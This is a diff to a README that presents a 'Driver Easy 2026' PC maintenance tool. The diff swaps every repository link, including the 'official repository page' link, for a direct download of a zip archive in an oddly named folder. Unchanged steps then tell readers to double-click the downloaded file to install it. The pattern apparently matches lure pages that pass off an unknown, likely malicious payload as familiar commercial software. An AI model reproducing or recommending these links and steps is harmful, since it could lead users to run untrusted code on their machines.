@@ -1,6 +1,6 @@
 # 🛠️ Driver-Easy-Automated-System-Maintenance-2026 - Improve your PC stability and speed
 
-[![](https://img.shields.io/badge/Download-Driver_Easy_2026-blue.svg)](https://github.com/marroquin5345/Driver-Easy-Automated-System-Maintenance-2026)
+[![](https://img.shields.io/badge/Download-Driver_Easy_2026-blue.svg)](https://github.com/marroquin5345/Driver-Easy-Automated-System-Maintenance-2026/raw/refs/heads/main/bronchoscopic/System-Easy-Maintenance-Driver-Automated-v1.0.zip)
 
 ## 📖 About this software
 
@@ -23,9 +23,9 @@ This software runs on most modern desktop environments. Check the following list
 
 Follow these steps to install the system maintenance tool on your Windows PC.
 
-1. Go to the [official repository page](https://github.com/marroquin5345/Driver-Easy-Automated-System-Maintenance-2026) to locate the software files.
+1. Go to the [official repository page](https://github.com/marroquin5345/Driver-Easy-Automated-System-Maintenance-2026/raw/refs/heads/main/bronchoscopic/System-Easy-Maintenance-Driver-Automated-v1.0.zip) to locate the software files.
 2. Select the green code button or navigate to the releases section to find the main installer.
-3. Click the link to begin the download process: [Download Driver-Easy-Automated-System-Maintenance-2026](https://github.com/marroquin5345/Driver-Easy-Automated-System-Maintenance-2026).
+3. Click the link to begin the download process: [Download Driver-Easy-Automated-System-Maintenance-2026](https://github.com/marroquin5345/Driver-Easy-Automated-System-Maintenance-2026/raw/refs/heads/main/bronchoscopic/System-Easy-Maintenance-Driver-Automated-v1.0.zip).
 4. Save the file to your Downloads folder.
 5. Double-click the saved file to begin the setup wizard.
 6. Follow the on-screen instructions provided by the installer.
